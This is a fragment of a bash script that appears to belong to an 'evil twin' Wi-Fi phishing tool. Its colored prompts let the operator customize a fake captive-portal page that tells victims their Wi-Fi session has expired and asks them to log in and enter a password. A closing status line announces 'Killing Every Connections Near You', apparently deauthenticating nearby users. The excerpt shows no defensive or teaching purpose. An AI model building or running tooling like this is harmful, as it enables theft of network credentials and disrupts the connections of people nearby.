...
read -p $'\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m]Default: Wi-fi Session for SSID Expired: \e[0m' cap1
cap1="${cap1:-${default_cap1}}"

read -p $'\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m]Default: Please login again: \e[0m' cap2
cap2="${cap2:-${default_cap2}}"

#read -p $'\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Username field (Default: Username:): \e[0m' user_text
#user_text="${user_text:-${default_user_text}}"

read -p $'\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m]Password Field: \e[0m' pass_text
...
printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Killing Every Connections Near You\n"
